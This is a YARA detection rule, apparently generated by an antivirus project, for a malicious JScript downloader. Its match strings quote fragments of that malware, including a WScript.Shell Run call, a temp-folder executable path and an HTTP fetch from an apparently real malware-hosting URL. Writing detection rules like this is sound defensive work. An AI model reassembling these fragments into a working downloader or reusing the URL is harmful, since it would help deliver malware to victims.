rule sig_20160328_698e2c5c039eb6a807858f599f5f6586 {
  meta:
    description = "datamaliciousorder - file 20160328_698e2c5c039eb6a807858f599f5f6586.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "55027b7a4f2f42b9a91d993ab86d49898d0f680d17eee8b65447479ec346ce2b"

  strings:
    $s1  = "function Plrippt() {return Dixkeg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"xryvSawO.exe\";};" fullword ascii
    $s2  = "Bcjuagb[Mevjqwurlk](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Qqhjwrxs](Xwmqcper() * 11)} while (Bcjuagb[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Dixkeg = function Fgxhzwc() {return WScript[Fsyow](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ezwrtdjr(Puhyt, Gpowxrnzc){return Puhyt - Gpowxrnzc;};" fullword ascii
    $s6  = "function Dgphhxkteq() {return ((Nzqokvyra == true) && (Nzqokvyra == Zpith)) ? 1 : Ybzxipe;};" fullword ascii
    $s7  = "function Vldpbjimc(Imwvlkqsw){Dixkeg[\"Run\"](Imwvlkqsw, Ybzxipe, Ybzxipe);};" fullword ascii
    $s8  = "function Fkvgbz(){return Hvcbokruz;};" fullword ascii
    $s9  = " while (Vpqqytyqa){" fullword ascii
    $s10 = "return Ezwrtdjr(Ouxmg, Cyifqi);" fullword ascii
    $s11 = "function Zpdosp(Gevinpexak) {var Iwamei = (1, 2, 3, 4, 5, Gevinpexak); return Iwamei;};" fullword ascii
    $s12 = "var Nzqokvyra = false;" fullword ascii
    $s13 = "Zpith = true; " fullword ascii
    $s14 = "var Xavdjdoi = false;" fullword ascii
    $s15 = "Nzqokvyra = true; " fullword ascii
    $s16 = "var Zpith = false;" fullword ascii
    $s17 = "function Mehcv()" fullword ascii
    $s18 = "function Xwmqcper(){return 22;};" fullword ascii
    $s19 = "function Dtejidrlcp(){return Fsyow;};" fullword ascii
    $s20 = "var Iwectrsknz = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}